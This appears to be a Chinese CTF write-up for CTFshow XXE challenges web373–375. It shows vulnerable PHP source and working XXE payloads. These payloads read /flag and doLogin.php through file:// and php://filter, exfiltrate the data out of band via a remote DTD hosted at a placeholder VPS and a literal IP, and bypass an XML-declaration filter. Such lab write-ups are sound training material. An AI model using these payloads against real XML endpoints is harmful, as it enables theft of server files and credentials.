
---
## CTFshow XXE web373
```php
<?php
error_reporting(0);
//不禁止外部实体载入
libxml_disable_entity_loader(false);
//拿POST原始数据，赋值给xmlfile
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    //生成一个Document
    $dom = new DOMDocument();
    // 调用loadXML方法，读取原始的XML数据（$xmlfile）。加载xml实体，参数为替代实体、加载外部子集
    //LIBXML_NOENT 是替代实体
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
  	// 把 DOM 对象转换为 PHP 对象。相当于从XML变成了PHP里面的对象。
    $creds = simplexml_import_dom($dom);
  	// 通过箭头表达式引用。
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);  

```

pyload
```php
<?xml version="1.0" encoding="UTF-8"?>
<!-- 定义hacker变量 -->
<!-- 外部实体的声明使用SYSTEM关键字，并且必须指定应从中加载实体值的URL。注入实体，值为根目录下flag文件内容 -->
<!DOCTYPE hacker[
    <!ENTITY hacker SYSTEM "file:///flag">
]> 
<!-- -->
<root>
<!-- PHP中$ctfshow = $creds->ctfshow; -->
    <ctfshow>
<!-- 读取hacker变量 -->
        &hacker;
    </ctfshow>
</root>

```
## CTFshow XXE web374

考点：无回显XXE，外部实体。
pyload1
```php
<?xml version="1.0" encoding="UTF-8"?>

<!-- 要引用（dtd里面），所以要加百分号% -->
<!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 -->
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % myurl SYSTEM "http://vps-ip/test.dtd">

    %myurl;
]> 
<!-- 不能直接<!ENTITY  % myurl SYSTEM "http://vps-ip:port/%file"> ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制-->
<!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&#x25; vps），那就会解析（&#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。
也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。
总结就是，%myurl 这种引用会自动向地址发送请求。 -->

<root>
1
</root>

```
pyload1
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY % dtd SYSTEM "http://124.71.115.19/hzh.dtd">
    %dtd;
    %send;
]>
```
p2
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php">
    <!ENTITY % dtd SYSTEM "http://124.71.115.19/hzh.dtd">
    %dtd;
    %send;
]>

```
接收数据可以访问get.php或者nc监控端口

## CTFshow XXE web375

题目过滤
```
<?xml version="1.0"
```

1、直接不写
2、中间多打一个空格
3、双引号代替单引号
